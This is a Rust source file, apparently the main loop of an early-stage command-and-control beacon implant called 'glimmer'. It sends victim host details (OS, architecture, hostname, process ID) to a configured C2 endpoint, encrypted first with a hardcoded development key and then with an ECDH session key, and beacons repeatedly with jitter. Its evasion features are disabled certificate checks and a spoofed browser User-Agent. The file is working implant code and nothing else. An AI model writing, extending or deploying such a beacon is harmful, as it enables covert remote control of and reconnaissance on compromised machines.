use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;

use glimmer::cfg::Config;
use glimmer::crypto::{EphemeralKeypair, SessionKey};
use glimmer::identity;
use glimmer::proto::{CheckinData, Envelope, MsgType};

fn main() {
    let config = match Config::load("config.json") {
        Ok(c) => c,
        Err(e) => {
            eprintln!("config: {}", e);
            std::process::exit(1);
        }
    };

    let node_id = identity::generate();
    let keypair = EphemeralKeypair::generate();
    let pub_key_bytes = keypair.public_key_bytes();

    // Bootstrap: send checkin encrypted with dev key
    let dev_key = SessionKey::from_bytes(*b"dev-key-replace-with-ecdh-later!");

    let checkin = CheckinData {
        os: std::env::consts::OS.into(),
        arch: std::env::consts::ARCH.into(),
        host: hostname(),
        pid: std::process::id(),
        pub_key: pub_key_bytes,
    };

    let server_pub_key = match send_message(
        MsgType::Checkin,
        &node_id,
        Some(&checkin),
        &dev_key,
        &config,
    ) {
        Ok(resp) => {
            if resp.is_empty() {
                eprintln!("[dev] checkin sent but no server key in response");
                std::process::exit(1);
            }
            match BASE64.decode(&resp) {
                Ok(key_bytes) => {
                    eprintln!(
                        "[dev] checkin complete, received server pubkey: {} bytes",
                        key_bytes.len()
                    );
                    key_bytes
                }
                Err(e) => {
                    eprintln!("[dev] failed to decode server key: {}", e);
                    std::process::exit(1);
                }
            }
        }
        Err(e) => {
            eprintln!("[dev] checkin failed: {}", e);
            std::process::exit(1);
        }
    };

    // Derive session key: beacon's ephemeral private + server's public
    let session_key = match keypair.derive_session_key(&server_pub_key) {
        Ok(key) => {
            eprintln!("[dev] ECDH session key derived");
            key
        }
        Err(e) => {
            eprintln!("[dev] key derivation failed: {}", e);
            std::process::exit(1);
        }
    };

    // Beacon loop using derived session key (ephemeral secret is zero'd in memory already)
    loop {
        match send_message(
            MsgType::Beacon,
            &node_id,
            None::<&()>,
            &session_key,
            &config,
        ) {
            Ok(_) => eprintln!("[dev] beacon sent"),
            Err(e) => eprintln!("[dev] beacon failed: {}", e),
        }

        sleep(config.beacon_interval(), config.jitter_percent);
    }
}

fn send_message<T: serde::Serialize>(
    msg_type: MsgType,
    node_id: &str,
    payload: Option<&T>,
    key: &SessionKey,
    config: &Config,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let envelope = match payload {
        Some(data) => Envelope::with_data(msg_type, node_id, data)?,
        None => Envelope::new(msg_type, node_id, None),
    };

    let serialized = envelope.marshal()?;
    let encrypted = key.encrypt(&serialized)?;
    let encoded = BASE64.encode(&encrypted);

    let endpoint = &config.c2_endpoints[0];
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(std::time::Duration::from_secs(30))
        .build()?;

    let resp = client
        .post(endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header(
            "User-Agent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        )
        .body(encoded)
        .send()?;

    let body = resp.bytes()?;
    Ok(body.to_vec())
}

fn sleep(base: std::time::Duration, jitter: f64) {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let random: f64 = rng.r#gen();
    let j = base.mul_f64(jitter * random);
    std::thread::sleep(base + j);
}

fn hostname() -> String {
    std::fs::read_to_string("/etc/hostname")
        .unwrap_or_else(|_| "unknown".into())
        .trim()
        .to_string()
}